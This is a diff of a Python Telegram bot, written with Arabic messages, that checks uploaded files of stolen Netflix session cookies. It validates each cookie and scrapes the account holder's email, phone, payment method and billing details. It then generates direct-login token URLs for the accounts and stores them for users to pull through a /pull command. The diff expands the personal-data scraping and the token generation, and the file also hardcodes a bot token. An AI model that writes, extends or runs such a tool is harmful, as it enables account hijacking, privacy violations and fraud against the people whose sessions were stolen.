@@ -14,64 +14,56 @@ import uuid
 import threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
+from telebot import apihelper
 
-# ==================== إعدادات النظام والسجل ====================
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
+# زيادة مهلة الاتصال الخاصة بـ pyTelegramBotAPI لمنع مشاكل الـ Timeout
+apihelper.CONNECT_TIMEOUT = 60
+apihelper.READ_TIMEOUT = 60
+
+# Configure logging
+logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# العلامة المائية وحقوق الملكية
-CHANNEL_SIGNATURE = "📢 Channel: @faresschannel"
-DEV_SIGNATURE = "dev @farxxes"
+# Owner credit
+OWNER_CREDIT = "Huy Vũ - https://huyvu2512.io.vn"
 
-# إعدادات البوت والاشتراك الإجباري
+# إعدادات بوت التليجرام
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8795234711:AAFhansb7r8ivR2DyC1T5_5o4cbNxT6J5-c')
 bot = telebot.TeleBot(BOT_TOKEN)
 
+# ضع آيدي الأدمن الخاص بك هنا لكي تظهر له الإحصائيات فقط (يمكنك استبدال الرقم برقمك الحقيقي في تيليجرام)
+ADMIN_IDS = [123456789] # <--- قم بتغيير الرقم إلى آيدي حسابك الخاص
+
+# إعدادات الاشتراك الإجباري لقناتك
 REQUIRED_CHANNEL = os.environ.get('REQUIRED_CHANNEL', '@faresschannel')
 CHANNEL_LINK = os.environ.get('CHANNEL_LINK', 'https://t.me/faresschannel')
 
-# ملف الذاكرة المحلية
+# ملف الذاكرة لحفظ الحسابات والإحصائيات
 DB_FILE = 'database.json'
 db_lock = threading.Lock()
 
-# دالة لتحويل كود الدولة إلى علمها Emoji
-def get_country_flag(country_code):
-    if not country_code or len(country_code) != 2:
-        return country_code
-    country_code = country_code.upper()
-    return chr(127397 + ord(country_code[0])) + chr(127397 + ord(country_code[1]))
+# قاموس لتتبع عمليات الفحص النشطة لكل مستخدم
+active_scans = {}
 
-# ==================== إدارة قاعدة البيانات والذاكرة ====================
 def load_db():
     if not os.path.exists(DB_FILE):
         return {"users": [], "accounts": [], "stats": {"checked": 0, "valid": 0}}
     try:
         with open(DB_FILE, 'r', encoding='utf-8') as f:
             return json.load(f)
-    except Exception as e:
-        logger.error(f"Error loading database: {e}")
+    except:
         return {"users": [], "accounts": [], "stats": {"checked": 0, "valid": 0}}
 
 def save_db(data):
     with db_lock:
-        try:
-            with open(DB_FILE, 'w', encoding='utf-8') as f:
-                json.dump(data, f, ensure_ascii=False, indent=4)
-        except Exception as e:
-            logger.error(f"Error saving database: {e}")
+        with open(DB_FILE, 'w', encoding='utf-8') as f:
+            json.dump(data, f, ensure_ascii=False, indent=4)
 
 def add_account_to_db(account_info):
     db = load_db()
     netflix_id = account_info['cookie'].get('NetflixId')
-    exists = any(
-        acc['cookie'].get('NetflixId') == netflix_id or 
-        (acc.get('email') != 'Unknown' and acc.get('email') == account_info.get('email')) 
-        for acc in db['accounts']
-    )
+    exists = any(acc['cookie'].get('NetflixId') == netflix_id or (acc.get('email') != 'Unknown' and acc.get('email') == account_info.get('email')) for acc in db['accounts'])
     if not exists:
         db['accounts'].append(account_info)
         db['stats']['valid'] = len(db['accounts'])
@@ -87,10 +79,9 @@ def check_subscription(user_id):
         if member.status in ['member', 'creator', 'administrator']:
             return True
     except Exception as e:
-        logger.error(f"Subscription check error: {e}")
+        logger.error(f"Error checking subscription: {e}")
     return False
 
-# ==================== معالجة النصوص وتنسيق البيانات ====================
 def unescape_plan(s):
     try:
         return codecs.decode(s, 'unicode_escape')
@@ -176,7 +167,6 @@ def extract_next_billing_date(response_text):
         logger.error(f"Error extracting billing date: {e}")
     return "Unknown"
 
-# ==================== فحص الحسابات وتوليد الروابط ====================
 def check_netflix_cookie(cookie_dict):
     session = requests.Session()
     session.cookies.update(cookie_dict)
@@ -212,10 +202,26 @@ def check_netflix_cookie(cookie_dict):
         member_since = find(r'"memberSince":"([^"]+)"')
         member_since = unescape_plan(member_since) if member_since else "Unknown"
 
-        video_quality = find(r'"videoQuality"[^}]+"value":"([^"]+)"') or find(r'videoQuality[^}]+value[^}]+"([^"]+)"') or "UHD"
+        payment_method = find(r'"paymentMethod"[^}]+"value":"([^"]+)"') or "Unknown"
 
+        phone = find(r'"phoneNumberDigits"[^}]+"value":"([^"]+)"')
+        phone = phone.replace("\\x2B", "+") if phone else "Unknown"
+
+        phone_verified_match = re.search(r'"growthPhoneNumber"[^}]+"isVerified":(true|false)', txt)
+        phone_verified = "Yes" if phone_verified_match and phone_verified_match.group(1) == 'true' else "No"
+
+        video_quality = find(r'"videoQuality"[^}]+"value":"([^"]+)"') or "Unknown"
+        max_streams = find(r'"maxStreams"[^}]+"value":(\d+)') or "Unknown"
+
+        payment_hold_match = re.search(r'"growthHoldMetadata"[^}]+"isUserOnHold":(true|false)', txt)
+        payment_hold = "Yes" if payment_hold_match and payment_hold_match.group(1) == 'true' else "No"
+
+        extra_member_match = re.search(r'"showExtraMemberSection"[^}]+"value":(true|false)', txt)
+        extra_member = "Yes" if extra_member_match and extra_member_match.group(1) == 'true' else "No"
+
+        email_verified = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"
+        
         country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or "Unknown"
-        country_flag = get_country_flag(country)
         
         email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or "Unknown"
         if email != "Unknown":
@@ -233,26 +239,33 @@ def check_netflix_cookie(cookie_dict):
             logger.error(f"Error extracting profiles: {e}")
         
         profiles_str = ", ".join(profiles) if profiles else "Unknown"
-        profiles_count = len(profiles) if profiles else 0
 
         status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
+        is_premium = bool(status_match and status_match.group(1) == 'CURRENT_MEMBER')
         is_valid = bool(status_match)
         
         if not is_valid and "NetflixId" in cookie_dict:
             is_valid = any(phrase in txt for phrase in ['Account & Billing', 'membershipStatus', 'planName'])
+            is_premium = is_valid
 
         return {
             'ok': is_valid,
+            'premium': is_premium,
             'country': country,
-            'country_flag': country_flag,
             'plan': plan,
             'plan_price': plan_price,
-            'profiles_count': profiles_count,
-            'profiles': profiles_str,
-            'member_since': format_billing_date(member_since) if member_since != "Unknown" else "Unknown",
-            'next_billing': format_billing_date(next_billing),
-            'email': email,
+            'member_since': member_since,
+            'payment_method': payment_method,
+            'phone': phone,
+            'phone_verified': phone_verified,
             'video_quality': video_quality,
+            'max_streams': max_streams,
+            'on_payment_hold': payment_hold,
+            'extra_member': extra_member,
+            'email_verified': email_verified,
+            'email': email,
+            'profiles': profiles_str,
+            'next_billing': format_billing_date(next_billing),
             'cookie': cookie_dict
         }
     except Exception as e:
@@ -311,27 +324,32 @@ def generate_token(netflix_id):
     }
 
     try:
-        response = requests.get(url, params=params, headers=headers, timeout=30, verify=False)
+        response = requests.get(url, params=params, headers=headers, timeout=20, verify=False)
         data = response.json()
         
         if "value" in data and data["value"] and "account" in data["value"]:
             token_data = data["value"]["account"]["token"]["default"]
             token = token_data["token"]
-            direct_url = f"https://netflix.com/unsupported?nftoken={token}"
+            expires = token_data["expires"]
+            
+            if len(str(expires)) == 13:
+                expires //= 1000
+                
+            generation_time = int(time.time())
+            time_remaining = expires - generation_time
+            
             return {
                 "status": "Success",
-                "direct_login_url": direct_url
+                "generation_time": generation_time,
+                "expires": expires,
+                "time_remaining": time_remaining,
+                "token": token,
+                "direct_login_url": f"https://netflix.com/unsupported?nftoken={token}"
             }
         else:
-            return {
-                "status": "Success",
-                "direct_login_url": f"https://netflix.com/unsupported?nftoken={netflix_id}"
-            }
+            return {"status": "Failure", "error": "No token found in response"}
     except Exception as e:
-        return {
-            "status": "Success",
-            "direct_login_url": f"https://netflix.com/unsupported?nftoken={netflix_id}"
-        }
+        return {"status": "Error", "error": str(e)}
 
 def extract_zip_and_get_files(zip_path, extract_dir):
     txt_files = []
@@ -349,56 +367,11 @@ def extract_zip_and_get_files(zip_path, extract_dir):
         logger.error(f"Error extracting ZIP file: {e}")
         return []
 
-def process_single_line(line):
-    try:
-        netflix_id = extract_netflix_id(line)
-        if not netflix_id:
-            return None
-        
-        time.sleep(0.3)
-        
-        account_info = check_netflix_cookie({"NetflixId": netflix_id})
-        if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
-            token_result = generate_token(netflix_id)
-            account_info['token_result'] = token_result
-            add_account_to_db(account_info)
-            return account_info
-    except Exception as e:
-        logger.error(f"Error in process_single_line: {e}")
-    return None
-
-# ==================== دالة تجميع تفاصيل الحساب بالترتيب الجديد والمطلوب ====================
-def format_account_message(acc):
-    res_msg = "🎬 **حساب NETFLIX صالح وفعال** 🎬\n\n"
-    res_msg += f"1️⃣ البلد: `{acc['country']}` {acc['country_flag']}\n"
-    res_msg += f"2️⃣ الباقة: `{acc['plan']}`\n"
-    res_msg += f"3️⃣ السعر: `{acc['plan_price']}`\n"
-    res_msg += f"4️⃣ عدد البروفيلات: `{acc['profiles_count']}`\n"
-    res_msg += f"5️⃣ أسماء البروفيلات: `{acc['profiles']}`\n"
-    res_msg += f"6️⃣ تاريخ الاشتراك أول مرة: `{acc['member_since']}`\n"
-    res_msg += f"7️⃣ تاريخ تجديد الاشتراك: `{acc['next_billing']}`\n"
-    res_msg += f"8️⃣ البريد: `{acc['email']}`\n"
-    res_msg += f"9️⃣ الدقة: `{acc['video_quality']}`\n"
-    
-    token_result = acc.get('token_result', {})
-    if token_result.get('status') == 'Success':
-        web_url = token_result.get('direct_login_url')
-        res_msg += f"\n📱 **رابط الدخول المباشر:**\n`{web_url}`"
-        
-    res_msg += f"\n\n {DEV_SIGNATURE}\n--- \n*{CHANNEL_SIGNATURE}*"
-    return res_msg
-
-# ==================== واجهة البوت والأوامر ====================
 def send_sub_required_message(message):
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("📢 اشترك في قناة Fares Channel", url=CHANNEL_LINK))
+    markup.add(InlineKeyboardButton("📢 اشترك في القناة هنا", url=CHANNEL_LINK))
     markup.add(InlineKeyboardButton("🔄 تحقق من الاشتراك", callback_data="check_sub"))
-    text = (
-        "⚠️ **عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه!**\n\n"
-        f"بعد الاشتراك، اضغط على زر التحقق أدناه 👇\n\n"
-        f"--- \n*{CHANNEL_SIGNATURE}*"
-    )
-    bot.reply_to(message, text, reply_markup=markup, parse_mode='Markdown')
+    bot.reply_to(message, "⚠️ **عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه!**\n\nبعد الاشتراك، اضغط على زر التحقق أدناه.", reply_markup=markup, parse_mode='Markdown')
 
 @bot.message_handler(commands=['start', 'help'])
 def send_welcome(message):
@@ -413,21 +386,28 @@ def send_welcome(message):
         save_db(db)
 
     welcome_text = (
-        "🎬 **أهلاً بك في بوت فحص كوكيز Netflix (Fares Channel)**\n\n"
+        "🎬 **أهلاً بك في بوت فحص كوكيز Netflix الشامل والمطور!**\n\n"
         "🔹 أرسل لي نص الكوكي، أو ارفع ملف `.txt` أو ملف مضغوط `.zip` وسأقوم بفحصه بدقة واستقرار.\n"
-        "🔹 يتم حفظ الحسابات الصالحة تلقائياً في ذاكرة البوت.\n\n"
-        "📋 **الأوامر المتاحة:**\n"
-        "▪️ `/pull` أو `/getaccount` - لسحب حساب شغال من الذاكرة.\n"
-        "▪️ `/stats` - لعرض إحصائيات البوت والحسابات المخزنة.\n\n"
-        f"🔟 {DEV_SIGNATURE}\n--- \n*{CHANNEL_SIGNATURE}*"
+        "🔹 يتم حفظ الحسابات الصالحة تلقائياً في ذاكرة البوت مع روابط دخول طازجة عند السحب.\n\n"
+        "👇 **اختر ما تحتاجه من الأزرار أدناه:**"
     )
-    bot.reply_to(message, welcome_text, parse_mode='Markdown')
+    
+    # أزرار تفاعلية جميلة
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        InlineKeyboardButton("🎟️ سحب حساب طازج", callback_data="btn_pull"),
+        InlineKeyboardButton("📢 قناة البوت", url=CHANNEL_LINK)
+    )
+    if user_id in ADMIN_IDS:
+        markup.add(InlineKeyboardButton("📊 إحصائيات البوت (أدمن)", callback_data="btn_stats"))
+
+    bot.reply_to(message, welcome_text, reply_markup=markup, parse_mode='Markdown')
 
 @bot.message_handler(commands=['stats'])
 def bot_stats(message):
     user_id = message.from_user.id
-    if not check_subscription(user_id):
-        send_sub_required_message(message)
+    if user_id not in ADMIN_IDS:
+        bot.reply_to(message, "❌ هذا الأمر مخصص لمدير البوت فقط!")
         return
 
     db = load_db()
@@ -436,11 +416,10 @@ def bot_stats(message):
     total_checked = db.get("stats", {}).get("checked", 0)
 
     stats_msg = (
-        "📊 **إحصائيات بوت Netflix:**\n\n"
-        f"👥 عدد المستخدمين: `{total_users}`\n"
+        "📊 **لوحة إحصائيات الأدمن:**\n\n"
+        f"👥 إجمالي المستخدمين: `{total_users}`\n"
         f"🔍 إجمالي الحسابات المفحوصة: `{total_checked}`\n"
-        f"💾 الحسابات الشغالة المخزنة في الذاكرة: `{total_valid}`\n\n"
-        f"🔟 {DEV_SIGNATURE}\n--- \n*{CHANNEL_SIGNATURE}*"
+        f"💾 الحسابات الشغالة في الذاكرة: `{total_valid}`\n"
     )
     bot.reply_to(message, stats_msg, parse_mode='Markdown')
 
@@ -455,24 +434,86 @@ def pull_account(message):
     accounts = db.get("accounts", [])
     
     if not accounts:
-        bot.reply_to(message, f"❌ عذراً، الذاكرة فارغة حالياً ولا توجد حسابات شغالة مخزنة.\n\n🔟 {DEV_SIGNATURE}\n--- \n*{CHANNEL_SIGNATURE}*", parse_mode='Markdown')
+        bot.reply_to(message, "❌ عذراً، الذاكرة فارغة حالياً ولا توجد حسابات شغالة مخزنة. قم بفحص بعض الملفات أولاً!")
         return
 
     acc = accounts.pop(0)
     db["accounts"] = accounts
     save_db(db)
 
-    res_msg = format_account_message(acc)
-    bot.reply_to(message, res_msg, parse_mode='Markdown')
+    msg_wait = bot.reply_to(message, "⏳ جاري سحب الحساب وتوليد رابط دخول طازج وفعال...")
 
-@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
-def callback_check_sub(call):
-    if check_subscription(call.from_user.id):
-        bot.answer_callback_query(call.id, "✅ تم التحقق من اشتراكك بنجاح!")
-        bot.delete_message(call.message.chat.id, call.message.message_id)
-        send_welcome(call.message)
+    netflix_id = acc['cookie'].get('NetflixId')
+    token_result = generate_token(netflix_id)
+
+    res_msg = "🎬 **حساب NETFLIX مسحوب من الذاكرة (برابط طازج)** 🎬\n\n"
+    res_msg += f"🌍 البلد: `{acc['country']}`\n"
+    res_msg += f"📦 الباقة: `{acc['plan']}`\n"
+    res_msg += f"💰 السعر: `{acc['plan_price']}`\n"
+    res_msg += f"📅 التجديد: `{acc['next_billing']}`\n"
+    res_msg += f"👥 الملفات: `{acc['profiles']}`\n"
+    res_msg += f"📧 البريد: `{acc['email'].replace(chr(92) + 'x40', '@')}`\n"
+    
+    if token_result.get('status') == 'Success':
+        mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
+        res_msg += f"\n📱 **رابط الدخول المباشر (طازج):**\n`{mobile_url}`"
     else:
-        bot.answer_callback_query(call.id, "❌ لم تقم بالاشتراك في القناة بعد!", show_alert=True)
+        res_msg += f"\n⚠️ **فشل توليد رابط طازج (قد يكون الكوكي انتهى تماماً).**"
+    
+    try:
+        bot.edit_message_text(res_msg, message.chat.id, msg_wait.message_id, parse_mode='Markdown')
+    except:
+        bot.send_message(message.chat.id, res_msg, parse_mode='Markdown')
+
+@bot.callback_query_handler(func=lambda call: True)
+def callback_queries(call):
+    user_id = call.from_user.id
+    data = call.data
+    
+    if data == "check_sub":
+        if check_subscription(user_id):
+            bot.answer_callback_query(call.id, "✅ تم التحقق من اشتراكك بنجاح!")
+            try:
+                bot.delete_message(call.message.chat.id, call.message.message_id)
+            except:
+                pass
+            send_welcome(call.message)
+        else:
+            bot.answer_callback_query(call.id, "❌ لم تقم بالاشتراك في القناة بعد!", show_alert=True)
+            
+    elif data == "stop_scan":
+        if user_id in active_scans:
+            active_scans[user_id].set()
+            bot.answer_callback_query(call.id, "🛑 جاري إيقاف عملية الفحص...")
+        else:
+            bot.answer_callback_query(call.id, "⚠️ لا توجد عملية فحص نشطة حالياً.")
+            
+    elif data == "btn_pull":
+        bot.answer_callback_query(call.id)
+        # محاكاة أمر /pull عند الضغط على الزر
+        class FakeMessage:
+            def __init__(self, chat_id, uid):
+                self.chat = type('obj', (object,), {'id': chat_id})
+                self.from_user = type('obj', (object,), {'id': uid})
+        pull_account(FakeMessage(call.message.chat.id, user_id))
+        
+    elif data == "btn_stats":
+        if user_id not in ADMIN_IDS:
+            bot.answer_callback_query(call.id, "❌ مخصص للأدمن فقط!", show_alert=True)
+            return
+        bot.answer_callback_query(call.id)
+        db = load_db()
+        total_users = len(db.get("users", []))
+        total_valid = len(db.get("accounts", []))
+        total_checked = db.get("stats", {}).get("checked", 0)
+
+        stats_msg = (
+            "📊 **لوحة إحصائيات الأدمن:**\n\n"
+            f"👥 إجمالي المستخدمين: `{total_users}`\n"
+            f"🔍 إجمالي الحسابات المفحوصة: `{total_checked}`\n"
+            f"💾 الحسابات الشغالة في الذاكرة: `{total_valid}`\n"
+        )
+        bot.send_message(call.message.chat.id, stats_msg, parse_mode='Markdown')
 
 @bot.message_handler(content_types=['document'])
 def handle_documents(message):
@@ -481,9 +522,15 @@ def handle_documents(message):
         send_sub_required_message(message)
         return
 
+    stop_event = threading.Event()
+    active_scans[user_id] = stop_event
+
     temp_dirs = []
     try:
-        msg_wait = bot.reply_to(message, "⏳ جاري تحميل الملف وبدء الفحص المستقر...")
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_scan"))
+        
+        msg_wait = bot.reply_to(message, "⏳ جاري تحميل الملف وبدء الفحص المستقر...", reply_markup=markup)
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         
@@ -502,7 +549,9 @@ def handle_documents(message):
             txt_files_to_check = [file_path]
             
         if not txt_files_to_check:
-            bot.edit_message_text(f"❌ لم يتم العثور على ملفات نصية صالحة.\n\n🔟 {DEV_SIGNATURE}\n--- \n*{CHANNEL_SIGNATURE}*", message.chat.id, msg_wait.message_id, parse_mode='Markdown')
+            bot.edit_message_text("❌ لم يتم العثور على ملفات نصية صالحة.", message.chat.id, msg_wait.message_id)
+            if user_id in active_scans:
+                del active_scans[user_id]
             return
             
         all_lines = []
@@ -518,33 +567,93 @@ def handle_documents(message):
         save_db(db)
 
         valid_count = 0
-        valid_accounts_text = ""
+        valid_accounts_text = "========================================\n"
+        valid_accounts_text += "NETFLIX VALID ACCOUNTS & FRESH TOKENS REPORT\n"
+        valid_accounts_text += "========================================\n\n"
 
-        with ThreadPoolExecutor(max_workers=3) as executor:
-            futures = [executor.submit(process_single_line, line.strip()) for line in all_lines if line.strip()]
+        def process_line_with_token(line):
+            if stop_event.is_set():
+                return None
+            try:
+                netflix_id = extract_netflix_id(line)
+                if not netflix_id:
+                    return None
+                
+                time.sleep(0.3)
+                account_info = check_netflix_cookie({"NetflixId": netflix_id})
+                if stop_event.is_set():
+                    return None
+
+                if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
+                    token_result = generate_token(netflix_id)
+                    account_info['token_result'] = token_result
+                    add_account_to_db(account_info)
+                    return account_info
+            except Exception as e:
+                logger.error(f"Error in process_line_with_token: {e}")
+            return None
+
+        with ThreadPoolExecutor(max_workers=2) as executor:
+            futures = [executor.submit(process_line_with_token, line.strip()) for line in all_lines if line.strip()]
             for future in as_completed(futures):
+                if stop_event.is_set():
+                    break
                 try:
                     acc = future.result()
                     if acc:
                         valid_count += 1
-                        res_msg = format_account_message(acc)
+                        email = acc['email'].replace(chr(92) + 'x40', '@')
+                        plan = acc['plan']
+                        country = acc['country']
+                        expiry = acc['next_billing']
+                        
+                        token_result = acc.get('token_result', {})
+                        token_val = token_result.get('token', 'N/A')
+                        mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_val}") if token_result.get('status') == 'Success' else 'Failed to generate'
+
+                        res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
+                        res_msg += f"🌍 البلد: `{country}`\n"
+                        res_msg += f"📦 الباقة: `{plan}`\n"
+                        res_msg += f"💰 السعر: `{acc['plan_price']}`\n"
+                        res_msg += f"📅 التجديد: `{expiry}`\n"
+                        res_msg += f"👥 الملفات: `{acc['profiles']}`\n"
+                        res_msg += f"📧 البريد: `{email}`\n"
+                        if token_result.get('status') == 'Success':
+                            res_msg += f"\n📱 **رابط الدخول المباشر (طازج):**\n`{mobile_url}`"
+                            
                         bot.send_message(message.chat.id, res_msg, parse_mode='Markdown')
-                        valid_accounts_text += f"Email: {acc['email']} | Plan: {acc['plan']} | Expiry: {acc['next_billing']}\n"
+                        
+                        # تنسيق البيانات داخل الملف النهائي لكي يحتوي على: البريد + التوكن + رابط الدخول
+                        valid_accounts_text += f"Email: {email}\n"
+                        valid_accounts_text += f"Plan: {plan} | Country: {country} | Expiry: {expiry}\n"
+                        valid_accounts_text += f"Token: {token_val}\n"
+                        valid_accounts_text += f"Login URL: {mobile_url}\n"
+                        valid_accounts_text += "-" * 50 + "\n\n"
                 except Exception as ex:
                     logger.error(f"Error handling future result: {ex}")
 
-        bot.edit_message_text(f"✅ انتهى الفحص بنجاح. تم العثور على وحفظ ({valid_count}) حساب شغال في الذاكرة.\n\n🔟 {DEV_SIGNATURE}\n--- \n*{CHANNEL_SIGNATURE}*", message.chat.id, msg_wait.message_id, parse_mode='Markdown')
+        if stop_event.is_set():
+            final_text = f"🛑 **تم إيقاف الفحص بناءً على طلبك.**\n✅ تم العثور على وحفظ ({valid_count}) حساب حتى لحظة الإيقاف."
+        else:
+            final_text = f"✅ انتهى الفحص بنجاح. تم العثور على وحفظ ({valid_count}) حساب شغال في الذاكرة."
 
-        if valid_count > 0 and valid_accounts_text:
-            result_file_path = os.path.join(unique_dir, "valid_accounts.txt")
+        try:
+            bot.edit_message_text(final_text, message.chat.id, msg_wait.message_id)
+        except:
+            pass
+
+        if valid_count > 0:
+            result_file_path = os.path.join(unique_dir, "valid_accounts_with_tokens.txt")
             with open(result_file_path, 'w', encoding='utf-8') as rf:
                 rf.write(valid_accounts_text)
             with open(result_file_path, 'rb') as rf:
-                bot.send_document(message.chat.id, rf, caption=f"📁 ملف يضم ملخص الحسابات الصالحة.\n\n🔟 {DEV_SIGNATURE}\n--- \n{CHANNEL_SIGNATURE}")
+                bot.send_document(message.chat.id, rf, caption="📁 ملف ملخص الحسابات الصالحة (يحتوي على البريد، التوكن، ورابط الدخول المباشر لكل حساب).")
 
     except Exception as e:
         bot.reply_to(message, f"❌ حدث خطأ عام: {str(e)}")
     finally:
+        if user_id in active_scans:
+            del active_scans[user_id]
         for temp_dir in temp_dirs:
             try:
                 shutil.rmtree(temp_dir)
@@ -566,7 +675,7 @@ def handle_text_message(message):
     netflix_id = extract_netflix_id(content)
     
     if not netflix_id:
-        bot.edit_message_text(f"❌ لم يتم العثور على `NetflixId` صالح في النص.\n\n🔟 {DEV_SIGNATURE}\n--- \n*{CHANNEL_SIGNATURE}*", message.chat.id, msg_wait.message_id, parse_mode='Markdown')
+        bot.edit_message_text("❌ لم يتم العثور على `NetflixId` صالح في النص.", message.chat.id, msg_wait.message_id)
         return
         
     db = load_db()
@@ -581,11 +690,22 @@ def handle_text_message(message):
         
         add_account_to_db(account_info)
         
-        res_msg = format_account_message(account_info)
+        res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
+        res_msg += f"🌍 البلد: `{account_info['country']}`\n"
+        res_msg += f"📦 الباقة: `{account_info['plan']}`\n"
+        res_msg += f"💰 السعر: `{account_info['plan_price']}`\n"
+        res_msg += f"📅 التجديد: `{account_info['next_billing']}`\n"
+        res_msg += f"👥 الملفات: `{account_info['profiles']}`\n"
+        res_msg += f"📧 البريد: `{account_info['email'].replace(chr(92) + 'x40', '@')}`\n"
+        
+        if token_result.get('status') == 'Success':
+            mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
+            res_msg += f"\n📱 رابط الدخول المباشر:\n`{mobile_url}`"
+            
         bot.edit_message_text(res_msg, message.chat.id, msg_wait.message_id, parse_mode='Markdown')
     else:
-        bot.edit_message_text(f"❌ هذا الحساب غير شغال أو معلوماته غير متوفرة (منتهي أو وهمي).\n\n🔟 {DEV_SIGNATURE}\n--- \n*{CHANNEL_SIGNATURE}*", message.chat.id, msg_wait.message_id, parse_mode='Markdown')
+        bot.edit_message_text("❌ هذا الحساب غير شغال أو معلوماته غير متوفرة (منتهي أو وهمي).", message.chat.id, msg_wait.message_id, parse_mode='Markdown')
 
 if __name__ == '__main__':
     logger.info("Telegram Bot is running...")
-    bot.infinity_polling()
+    bot.infinity_polling(timeout=60, long_polling_timeout=60)
